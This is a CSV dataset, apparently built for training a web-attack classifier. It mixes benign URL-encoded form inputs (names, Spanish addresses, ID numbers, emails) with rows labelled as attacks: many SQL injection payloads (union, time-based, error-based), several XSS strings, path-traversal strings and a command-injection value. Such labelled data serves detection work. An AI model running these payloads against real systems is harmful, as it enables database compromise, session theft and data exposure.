payload,payload_len,alpha,non_alpha,attack_feature,label
1%29%20as%20lejp%20where%205238%3D5238%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%23,69,89.85507246376811,10.144927536231885,90000.0,1
contrabasa,10,100.0,0.0,0.0,0
isabel%20la%20catolica%2C%205,21,100.0,0.0,0.0,0
vanderbu,8,100.0,0.0,0.0,0
-2992%25%27%29%29%29%20or%204493%3Dutl_inaddr.get_host_address%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284493%3D4493%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7C,221,53.39366515837104,18.552036199095024,60000.0,1
choon,5,100.0,0.0,0.0,0
5.69342E+15,16,68.75,31.25,45.45454545454545,0
cifelli,7,100.0,0.0,0.0,0
giridhar,8,100.0,0.0,0.0,0
1%22%29%29%20as%20aozi%20where%203354%3D3354%20waitfor%20delay%20%270%3A0%3A5%27--,52,80.76923076923077,19.230769230769234,60000.0,1
torie,5,100.0,0.0,0.0,0
1%25%22%29%29%20or%205286%3D%28select%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%29%20and%20%28%28%22%25%22%3D%22,113,76.99115044247787,23.008849557522122,90000.0,1
quint,5,100.0,0.0,0.0,0
/////////%7Bfile%7D,15,86.66666666666667,13.333333333333329,15.384615384615378,1
23338,5,100.0,0.0,0.0,0
1%27%20in%20boolean%20mode%29%20and%208514%3D%28select%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%29%23,114,87.71929824561403,12.280701754385964,60000.0,1
1%25%27%29%20or%20elt%285873%3D5873%2Csleep%285%29%29%23,32,68.75,31.25,30000.0,1
ivette,6,100.0,0.0,0.0,0
tarragona,9,100.0,0.0,0.0,0
monteoliva%20pags,15,100.0,0.0,0.0,0
santa%20cruz%20de%20la%20palma,22,100.0,0.0,0.0,0
81621470j,9,100.0,0.0,0.0,0
hornillos%20s/n%2C,14,100.0,0.0,0.0,0
15495714q,9,100.0,0.0,0.0,0
40170,5,100.0,0.0,0.0,0
-8034%22%29%20where%201292%3D1292%20union%20all%20select%201292%2C1292%2C1292%2C1292%2C1292%23,66,86.36363636363636,13.636363636363635,90000.0,1
barbar%20ocaranza,15,100.0,0.0,0.0,0
1.7559E+15,16,62.5,37.5,60.0,0
6.10757E+15,16,68.75,31.25,45.45454545454545,0
%3Cxml%20id%3D%22crosssitescripting%22%3E%3Ci%3E%3Cb%3E%3Cimg%20src%3D%22javas%3C%21--%20--%3Ecript%3Adocument.cookie%3Dtrue%22%3E%3C/b%3E%3C/i%3E%3C/xml%3E%3Cspan%20datasrc%3D%22%23crosssitescripting%22%20datafld%3D%22b%22%20dataformatas%3D%22html%22%3E%3C/span%3E,175,72.57142857142857,27.42857142857143,60000.0,1
fariba,6,100.0,0.0,0.0,0
1%20where%205081%3D5081%20or%20char%2868%29%7C%7Cchar%2869%29%7C%7Cchar%2897%29%7C%7Cchar%2885%29%3Dregexp_substring%28repeat%28right%28char%285389%29%2C0%29%2C5000000000%29%2Cnull%29--,123,75.60975609756098,24.390243902439025,60000.0,1
1%25%27%29%29%20and%202006%3D2006,19,73.68421052631578,26.31578947368421,30000.0,1
c/%20ereta%2C%20104%2C,14,100.0,0.0,0.0,0
calle%20juan%20de%20uceda%2C%20180%2C,25,100.0,0.0,0.0,0
jara%20escobedo,13,100.0,0.0,0.0,0
-4944%25%22%29%29%20or%20make_set%281084%3D1988%2C1988%29%20and%20%28%28%22%25%22%3D%22,49,65.3061224489796,34.69387755102041,60000.0,1
8.17593E+15,16,68.75,31.25,45.45454545454545,0
alden%40b-sign.sv,15,100.0,0.0,0.0,0
randall,7,100.0,0.0,0.0,0
%2Bdir%2Bc%3A/,8,87.5,12.5,14.285714285714285,1
8.87551E+14,16,68.75,31.25,45.45454545454545,0
0cep8o,6,100.0,0.0,0.0,0
1%29%29%29%20or%20sleep%285%29%23,17,64.70588235294117,35.294117647058826,30000.0,1
25585710g,9,100.0,0.0,0.0,0
1%20and%203202%3Dlike%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29%23%20qmkh,68,79.41176470588235,20.588235294117645,39000.0,1
1%27%29%20rlike%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29sgvo%29%20and%20%28%27lzbn%27%3D%27lzbn,66,75.75757575757575,24.242424242424242,60000.0,1
quebrador,9,100.0,0.0,0.0,0
paula%20pladellorens,18,100.0,0.0,0.0,0
lauraine,8,100.0,0.0,0.0,0
hrcules,7,100.0,0.0,0.0,0
95937804c,9,100.0,0.0,0.0,0
11106027v,9,100.0,0.0,0.0,0
1%22%29%20where%205196%3D5196%20and%206055%3Dctxsys.drithsx.sn%286055%2C%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%286055%3D6055%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%29--,217,72.35023041474655,27.64976958525346,90000.0,1
1%29%29%20and%20sleep%285%29%20and%20%28%289084%3D9084,32,78.125,21.875,60000.0,1
6965,4,100.0,0.0,0.0,0
6o40o41,7,100.0,0.0,0.0,0
c/%20tamarindo%2C%20109%209e,20,100.0,0.0,0.0,0
pericles,8,100.0,0.0,0.0,0
1%25%22%29%29%20and%20exp%28~%28select%20%2A%20from%20%28select%20concat%280x7171706a71%2C%28select%20%28elt%288190%3D8190%2C1%29%29%29%2C0x717a767a71%2C0x78%29%29x%29%29%20and%20%28%28%22%25%22%3D%22,120,73.33333333333333,25.833333333333336,90000.0,1
61323691x,9,100.0,0.0,0.0,0
defrance,8,100.0,0.0,0.0,0
1%27%29%29%29%20and%205934%3D2309,19,73.68421052631578,26.31578947368421,30000.0,1
deglutir,8,100.0,0.0,0.0,0
lncara,6,100.0,0.0,0.0,0
1%25%27%20and%202388%3Dbenchmark%285000000%2Cmd5%280x6d457153%29%29%23,48,81.25,18.75,30000.0,1
1%25%27%29%29%20and%206969%3D%28select%206969%20from%20pg_sleep%285%29%29%20and%20%28%28%27%25%27%3D%27,57,70.17543859649122,29.82456140350877,90000.0,1
1%29%29%29%20and%208189%3D%28select%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%29--,107,85.04672897196261,14.953271028037381,60000.0,1
%7D%3C/style%3E%3Cscript%3Ea%3Deval%3Bb%3Dalert%3Ba%28b%28/xss/.source%29%29%3B%3C/script%3E,60,76.66666666666667,23.33333333333333,30.43478260869564,1
1%29%20or%20elt%286272%3D6272%2Csleep%285%29%29%20and%20%288600%3D8600,44,79.54545454545455,20.454545454545457,60000.0,1
-7962%27%29%29%20as%20pgqz%20where%206058%3D6058%20or%204493%3Dutl_inaddr.get_host_address%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284493%3D4493%29%20then%201%20else%200%20e,232,55.603448275862064,15.517241379310345,60000.0,1
aflechate,9,100.0,0.0,0.0,0
%28select%20%28case%20when%20%286838%3D2866%29%20then%206838%20else%201/%28select%200%29%20end%29%29,64,87.5,12.5,14.285714285714285,1
6.80379E+15,16,68.75,31.25,45.45454545454545,0
6.67989E+15,16,68.75,31.25,45.45454545454545,0
1%22%29%20where%208878%3D8878%20or%20%28select%209173%20from%28select%20count%28%2A%29%2Cconcat%280x7171706a71%2C%28select%20%28elt%289173%3D9173%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x%20from%20information_schema.character_sets%20group%20by%20x%29a%29--,191,82.19895287958116,17.801047120418847,90000.0,1
50619,5,100.0,0.0,0.0,0
t53s97ln747a,12,100.0,0.0,0.0,0
1%29%29%29%20and%20char%28107%29%7C%7Cchar%28121%29%7C%7Cchar%2897%29%7C%7Cchar%2880%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29--,145,69.6551724137931,30.344827586206897,30000.0,1
7766,4,100.0,0.0,0.0,0
legitimacin,11,100.0,0.0,0.0,0
1%29%20where%206788%3D6788%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,82,85.36585365853658,14.634146341463413,90000.0,1
-3667%25%27%29%29%20union%20all%20select%203560%2C3560%2C3560--,43,79.06976744186046,20.930232558139537,60000.0,1
mamukos4%40culturalsanpedrocf.uk,30,100.0,0.0,0.0,0
abadal%20braup,12,100.0,0.0,0.0,0
1%22%20and%209660%3D%28select%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%29--,101,82.17821782178217,17.82178217821782,60000.0,1
75459581p,9,100.0,0.0,0.0,0
co5r5525e,9,100.0,0.0,0.0,0
-7347%22%29%29%20union%20all%20select%204360%2C4360%2C4360%2C4360%2C4360%2C4360%2C4360%2C4360%2C4360%23,71,81.69014084507043,18.30985915492958,60000.0,1
sant%20celoni,11,100.0,0.0,0.0,0
03482859s,9,100.0,0.0,0.0,0
9054,4,100.0,0.0,0.0,0
40352,5,100.0,0.0,0.0,0
1934,4,100.0,0.0,0.0,0
ep9scopologio,13,100.0,0.0,0.0,0
-4091%22%29%29%29%20union%20all%20select%206694%2C6694--,38,78.94736842105263,21.052631578947366,60000.0,1
8.72841E+15,16,68.75,31.25,45.45454545454545,0
1%22%29%29%20or%208421%3D%28select%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%29%20and%20%28%28%22vhey%22%3D%22vhey,81,76.5432098765432,23.456790123456788,90000.0,1
1.04186E+15,16,68.75,31.25,45.45454545454545,0
heintje0%40alpesfranceses.com.ro,30,100.0,0.0,0.0,0
narvarte%20delgado,16,100.0,0.0,0.0,0
aricel,6,100.0,0.0,0.0,0
1%27%2B%28select%20%27hjku%27%20where%201954%3D1954%20and%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29fzno%29%29%2B%27,79,77.21518987341773,22.78481012658228,90000.0,1
perseidas,9,100.0,0.0,0.0,0
-9871%20union%20all%20select%206094%2C6094%2C6094%2C6094%2C6094%2C6094%2C6094%23,58,86.20689655172413,13.793103448275861,60000.0,1
r3nci8l5so,10,100.0,0.0,0.0,0
1%22%3Biif%285257%3D5257%2C1%2C1/0%29,23,82.6086956521739,17.391304347826093,21.052631578947377,1
requilorio,10,100.0,0.0,0.0,0
mead-neudorfer4%40joyclub.au,26,100.0,0.0,0.0,0
-7482%22%29%29%29%20or%209077%3D2651,22,72.72727272727273,27.27272727272727,30000.0,1
golpejas,8,100.0,0.0,0.0,0
1%27%29%29%20and%207533%3D7533%20and%20%28%28%27pagc%27%20like%20%27pagc,42,78.57142857142857,21.428571428571427,90000.0,1
33470889r,9,100.0,0.0,0.0,0
exte69a1i29,11,100.0,0.0,0.0,0
millot_power%40guejos.sv,22,100.0,0.0,0.0,0
3o22ciabl3,10,100.0,0.0,0.0,0
marqus,6,100.0,0.0,0.0,0
1%25%22%20or%20char%2868%29%7C%7Cchar%2869%29%7C%7Cchar%2897%29%7C%7Cchar%2885%29%3Dregexp_substring%28repeat%28right%28char%285389%29%2C0%29%2C5000000000%29%2Cnull%29%20and%20%22%25%22%3D%22,117,70.94017094017094,29.059829059829063,60000.0,1
diafragmar,10,100.0,0.0,0.0,0
calle%20crehuet%2C%2063%204-h,21,100.0,0.0,0.0,0
delf,4,100.0,0.0,0.0,0
1%27%29%29%20or%20%28select%209173%20from%28select%20count%28%2A%29%2Cconcat%280x7171706a71%2C%28select%20%28elt%289173%3D9173%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x%20from%20information_schema.character_sets%20group%20by%20x%29a%29%20and%20%28%28%27rdpv%27%3D%27rdpv,193,80.31088082901555,19.689119170984455,90000.0,1
3.46784E+15,16,68.75,31.25,45.45454545454545,0
1%25%27%29%20and%209198%3D9198--,20,70.0,30.0,30000.0,1
/0x2e0x2ex2e0x2ex2e0x2ex2e0x2ex2e0x2ex2e0x2e%7Bfile%7D,50,96.0,4.0,4.166666666666666,1
inord2n6da7e401,15,100.0,0.0,0.0,0
1%22%29%29%29%3Bselect%20%2A%20from%20generate_series%284592%2C4592%2Ccase%20when%20%284592%3D4592%29%20then%201%20else%200%20end%29%20limit%201--,96,83.33333333333334,16.666666666666664,30000.0,1
1%20and%204386%3Dutl_inaddr.get_host_address%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284386%3D4386%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29--%20icxn,207,72.94685990338165,27.053140096618357,60000.0,1
1%27%20where%208729%3D8729%3Bselect%20benchmark%285000000%2Cmd5%280x714e4153%29%29%23,61,85.24590163934425,14.754098360655737,30000.0,1
1%27%29%29%29%3Bselect%20benchmark%285000000%2Cmd5%280x4c4d6142%29%29%20and%20%28%28%28%27egnv%27%20like%20%27egnv,72,77.77777777777779,22.22222222222222,60000.0,1
1%25%22%29%29%29%3Bselect%20%28case%20when%20%284996%3D1734%29%20then%201%20else%204996%2A%28select%204996%20from%20master..sysdatabases%29%20end%29--,100,82.0,18.0,30000.0,1
regidor%20fa,10,100.0,0.0,0.0,0
abieldar,8,100.0,0.0,0.0,0
43550,5,100.0,0.0,0.0,0
1%29%20or%207417%3D%28select%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%29--,104,86.53846153846155,13.461538461538462,60000.0,1
-7125%22%20or%20%288919%3D2275%29%2A2275%20and%20%22fbwo%22%3D%22fbwo,43,76.74418604651163,23.25581395348837,60000.0,1
cowper%40elbauldelosrefranes.pm,29,100.0,0.0,0.0,0
vyza,4,100.0,0.0,0.0,0
goth-komarov%40frenchpolynesia.com.mg,35,100.0,0.0,0.0,0
1%29%20where%202083%3D2083%3Bcall%20regexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29--,119,75.63025210084034,24.369747899159663,30000.0,1
1.68699E+15,16,68.75,31.25,45.45454545454545,0
floreal,7,100.0,0.0,0.0,0
%28select%20%28case%20when%20%289856%3D9856%29%20then%20sleep%285%29%20else%209856%2A%28select%209856%20from%20information_schema.character_sets%29%20end%29%29,113,86.72566371681415,13.274336283185843,30000.0,1
34491,5,100.0,0.0,0.0,0
68169107m,9,100.0,0.0,0.0,0
landesman%40cohel.mw,18,100.0,0.0,0.0,0
-4256%27%29%20where%209545%3D9545%20or%205023%3Dctxsys.drithsx.sn%285023%2C%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%285023%3D5023%29%20then%201%20else%200%20end%29%20from%20,220,56.81818181818182,16.363636363636363,90000.0,1
eva,3,100.0,0.0,0.0,0
gorrero,7,100.0,0.0,0.0,0
d6ntrotr566,11,100.0,0.0,0.0,0
1%27%29%20and%20extractvalue%287982%2Cconcat%280x5c%2C0x7171706a71%2C%28select%20%28elt%287982%3D7982%2C1%29%29%29%2C0x717a767a71%29%29%20and%20%28%27pmzp%27%20like%20%27pmzp,116,81.03448275862068,18.96551724137931,90000.0,1
d6s316ar,8,100.0,0.0,0.0,0
entwistle_ruetting%40comonuevo.ro,31,100.0,0.0,0.0,0
1%27%29%20waitfor%20delay%20%270%3A0%3A5%27%20and%20%28%27vtfs%27%3D%27vtfs,43,74.4186046511628,25.581395348837212,60000.0,1
-6200%25%27%29%29%20or%208077%3D4661,22,72.72727272727273,27.27272727272727,30000.0,1
galbarros,9,100.0,0.0,0.0,0
94335965q,9,100.0,0.0,0.0,0
1980,4,100.0,0.0,0.0,0
%3C%21--%3Cvalue%3E%3C%21%5Bcdata%5B%3Cxml%20id%3Di%3E%3Cx%3E%3Cc%3E%3C%21%5Bcdata%5B%3Cimg%20id%3Dxss%20src%3D%22javas%3C%21%5Bcdata%5Bcript%3Aalert%28%27xss%27%29%3B%22%3E,97,67.0103092783505,32.989690721649495,49.230769230769255,1
52948186r,9,100.0,0.0,0.0,0
pujada%20parc%20111%2C%201-a,20,100.0,0.0,0.0,0
raimund,7,100.0,0.0,0.0,0
-8771%22%29%29%20union%20all%20select%206302%2C6302%2C6302%2C6302%2C6302%23,51,82.35294117647058,17.647058823529413,60000.0,1
catatipia,9,100.0,0.0,0.0,0
1%20and%203202%3Dlike%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29,62,79.03225806451613,20.967741935483872,39000.0,1
eggebraa,8,100.0,0.0,0.0,0
calle%20tajo%2C%20182%2C,16,100.0,0.0,0.0,0
3.54937E+15,16,68.75,31.25,45.45454545454545,0
ittaly,6,100.0,0.0,0.0,0
1%27%7C%7C%28select%20%27rask%27%20from%20dual%20where%209411%3D9411%20and%204241%3Dconvert%28int%2C%28select%20char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select%20%28case%20when%20%284241%3D4241%29%20then%20char%2849%29%20else%20char%2848%29%20end%29%29%2Bchar%28113%29%2Bchar%28122%29%2Bchar%28118%29%2Bchar%28122%29%2Bchar%28113%29%29%29%29%7C%7C%27,244,76.22950819672131,23.770491803278688,90000.0,1
5.80521E+15,16,68.75,31.25,45.45454545454545,0
1%27%20in%20boolean%20mode%29%20and%202388%3Dbenchmark%285000000%2Cmd5%280x6d457153%29%29%23,64,85.9375,14.0625,30000.0,1
select%20%27qqpjq%27%7C%7C%28select%20%28case%20when%20%282933%3D2933%29%20then%201%20else%200%20end%29%29%7C%7C%27qzvzq%27,75,81.33333333333333,18.66666666666667,22.950819672131153,1
6670,5,80.0,20.0,25.0,0
1%27%29%20and%206969%3D%28select%206969%20from%20pg_sleep%285%29%29%20and%20%28%27ayol%27%3D%27ayol,61,78.68852459016394,21.311475409836063,90000.0,1
9.99969E+15,16,68.75,31.25,45.45454545454545,0
09301966f,9,100.0,0.0,0.0,0
90946866j,9,100.0,0.0,0.0,0
1%22%20where%201100%3D1100%3Bselect%20count%28%2A%29%20from%20generate_series%281%2C5000000%29--,68,82.35294117647058,17.647058823529413,60000.0,1
desolladamen-te,15,100.0,0.0,0.0,0
-8093%22%29%29%20as%20oboi%20where%201476%3D1476%20union%20all%20select%201476%2C1476%2C1476%2C1476%23,70,87.14285714285714,12.857142857142856,90000.0,1
1%29%29%3Biif%285257%3D5257%2C1%2C1/0%29,24,79.16666666666666,20.833333333333343,26.315789473684227,1
dnica,5,100.0,0.0,0.0,0
mandayona,9,100.0,0.0,0.0,0
indiestro,9,100.0,0.0,0.0,0
riudavet,8,100.0,0.0,0.0,0
brot%20calderer,13,100.0,0.0,0.0,0
-3963%22%20or%201224%3D5119,19,84.21052631578947,15.789473684210526,30000.0,1
26580,5,100.0,0.0,0.0,0
inocencia%20alayon%2C%20s/n%204-f,25,100.0,0.0,0.0,0
1%22%29%29%20or%208384%3Dlike%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29%20and%20%28%28%22giuq%22%3D%22giuq,83,73.49397590361446,26.506024096385545,69000.0,1
jaenicke%40lamola-hotel.coop,26,100.0,0.0,0.0,0
semicopado,10,100.0,0.0,0.0,0
c/%20torre%20de%20romo%20s/n%201f,23,100.0,0.0,0.0,0
1%25%22%20and%208514%3D%28select%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%29%20and%20%22%25%22%3D%22,107,83.17757009345794,16.822429906542055,90000.0,1
karlweiss%40barnicesuv.gov,24,100.0,0.0,0.0,0
cardenal%20mendoza%20s/n%2C%207%3Fh,25,100.0,0.0,0.0,0
-7568%22%29%29%29%20or%204493%3Dutl_inaddr.get_host_address%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284493%3D4493%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr,232,52.1551724137931,17.24137931034483,60000.0,1
1%27%20where%202160%3D2160%20and%20exp%28~%28select%20%2A%20from%20%28select%20concat%280x7171706a71%2C%28select%20%28elt%288190%3D8190%2C1%29%29%29%2C0x717a767a71%2C0x78%29%29x%29%29--,123,79.67479674796748,19.51219512195122,90000.0,1
01538912m,9,100.0,0.0,0.0,0
1%22%29%20as%20evoq%20where%208193%3D8193%20or%20char%2868%29%7C%7Cchar%2869%29%7C%7Cchar%2897%29%7C%7Cchar%2885%29%3Dregexp_substring%28repeat%28right%28char%285389%29%2C0%29%2C5000000000%29%2Cnull%29--,133,75.93984962406014,24.06015037593985,60000.0,1
1%22%29%29%29%20and%208312%3Ddbms_pipe.receive_message%28chr%2869%29%7C%7Cchr%2879%29%7C%7Cchr%28101%29%7C%7Cchr%2868%29%2C5%29--,81,66.66666666666666,33.33333333333333,30000.0,1
/0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f%7Bfile%7D,103,98.05825242718447,1.9417475728155296,1.9801980198019757,1
1%29%20and%203715%20in%20%28%28char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select%20%28case%20when%20%283715%3D3715%29%20then%20char%2849%29%20else%20char%2848%29%20end%29%29%2Bchar%28113%29%2Bchar%28122%29%2Bchar%28118%29%2Bchar%28122%29%2Bchar%28113%29%29%29,183,74.86338797814209,25.136612021857925,30000.0,1
%3Clink%20rel%3D%22stylesheet%22%20href%3D%22http%3A//vulnerability-lab.com/crosssitescripting.css%22%3E,82,91.46341463414635,8.536585365853654,9.333333333333329,1
nicols,6,100.0,0.0,0.0,0
6.82142E+15,16,68.75,31.25,45.45454545454545,0
ailn,4,100.0,0.0,0.0,0
intuitivo,9,100.0,0.0,0.0,0
9274,4,100.0,0.0,0.0,0
-6637%27%29%29%20order%20by%201%23,20,75.0,25.0,30000.0,1
horst%40engibraltar.com.co,24,100.0,0.0,0.0,0
-9122%29%20as%20sdlg%20where%201546%3D1546%20union%20all%20select%201546%2C1546%2C1546%2C1546%2C1546%2C1546%2C1546--,84,86.90476190476191,13.095238095238097,90000.0,1
roze,4,100.0,0.0,0.0,0
1%25%22%3Bif%288995%3D9787%29%20select%208995%20else%20drop%20function%20ofgg--,55,85.45454545454545,14.545454545454545,60000.0,1
68689912k,9,100.0,0.0,0.0,0
-9176%27%29%29%20as%20eunw%20where%205978%3D5978%20or%201%20group%20by%20concat%280x7171706a71%2C%28select%20%28case%20when%20%284232%3D4232%29%20then%201%20else%200%20end%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29%20having%20min%280%29%23,163,84.66257668711657,15.337423312883436,60000.0,1
1%22%29%29%20or%20updatexml%281808%2Cconcat%280x2e%2C0x7171706a71%2C%28select%20%28elt%281808%3D1808%2C1%29%29%29%2C0x717a767a71%29%2C8666%29%20and%20%28%28%22ghdr%22%20like%20%22ghdr,119,78.99159663865547,21.008403361344538,90000.0,1
4244,4,100.0,0.0,0.0,0
plaza%20diego%20herrera%20lorenzo%2C%20148%208%3Fe,36,100.0,0.0,0.0,0
10460,5,100.0,0.0,0.0,0
polanco,7,100.0,0.0,0.0,0
marines%2C%20los,12,100.0,0.0,0.0,0
1%25%22%29%29%20and%20sleep%285%29%20and%20%28%28%22%25%22%3D%22,30,56.666666666666664,43.333333333333336,60000.0,1
paolo,5,100.0,0.0,0.0,0
ingeniero%20pedro%20leon%2C%20160%2C%2010-b,31,100.0,0.0,0.0,0
escaler%20astorquiza,18,100.0,0.0,0.0,0
1%20or%205356%3D%28select%20count%28%2A%29%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%29--,153,90.84967320261438,9.15032679738562,60000.0,1
6.45367E+15,16,68.75,31.25,45.45454545454545,0
1%22%20where%204082%3D4082%20and%20elt%285699%3D1432%2C1432%29--,44,81.81818181818183,18.181818181818183,60000.0,1
machar,6,100.0,0.0,0.0,0
1%27%20where%204102%3D4102%20or%20extractvalue%281297%2Cconcat%280x5c%2C0x7171706a71%2C%28select%20%28elt%281297%3D1297%2C1%29%29%29%2C0x717a767a71%29%29--,109,81.65137614678899,18.34862385321101,60000.0,1
alexande,8,100.0,0.0,0.0,0
1%25%22%29%20and%206510%3D%28select%20count%28%2A%29%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%29%20and%20%28%22%25%22%3D%22,166,87.34939759036145,12.650602409638553,90000.0,1
elsie,5,100.0,0.0,0.0,0
97lea0,6,100.0,0.0,0.0,0
2.81791E+15,16,68.75,31.25,45.45454545454545,0
1%22%29%20where%202633%3D2633%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%23,57,87.71929824561403,12.280701754385964,90000.0,1
1%27%2B%28select%20%27vbqo%27%20where%205630%3D5630%20procedure%20analyse%28extractvalue%289627%2Cconcat%280x5c%2C%28benchmark%285000000%2Cmd5%280x4b774c75%29%29%29%29%29%2C1%29%23,124,81.45161290322581,18.548387096774192,30000.0,1
magriny,7,100.0,0.0,0.0,0
iza,3,100.0,0.0,0.0,0
6.31786E+15,16,68.75,31.25,45.45454545454545,0
bolt%40expofloralzaragoza2014.py,30,100.0,0.0,0.0,0
1%27%3Bselect%20case%20when%207717%3D7717%20then%201%20else%20null%20end--,52,96.15384615384616,3.8461538461538396,3.9999999999999933,1
2660,5,80.0,20.0,25.0,0
morek,5,100.0,0.0,0.0,0
3.18273E+15,16,68.75,31.25,45.45454545454545,0
-1269%27%20or%201570%3Dconvert%28int%2C%28select%20char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select%20%28case%20when%20%281570%3D1570%29%20then%20char%2849%29%20else%20char%2848%29%20end%29%29%2Bchar%28113%29%2Bcha,223,56.95067264573991,16.143497757847534,30000.0,1
jobye,5,100.0,0.0,0.0,0
9751,4,100.0,0.0,0.0,0
54738650f,9,100.0,0.0,0.0,0
pl.%20de%20belen%20153%2C%206%3Fc,21,100.0,0.0,0.0,0
1%27%2C%28select%20%28case%20when%20%285777%3D5777%29%20then%201%20else%20cast%281%20as%20int%29/%28select%200%20from%20dual%29%20end%29%20from%20dual%29,97,85.56701030927834,14.432989690721648,60000.0,1
kenna,5,100.0,0.0,0.0,0
mau%40gaudio.an,13,100.0,0.0,0.0,0
pealsordo,9,100.0,0.0,0.0,0
-1084%20where%201181%3D1181%20or%20make_set%289354%3D9354%2C7185%29--,51,82.35294117647058,17.647058823529413,60000.0,1
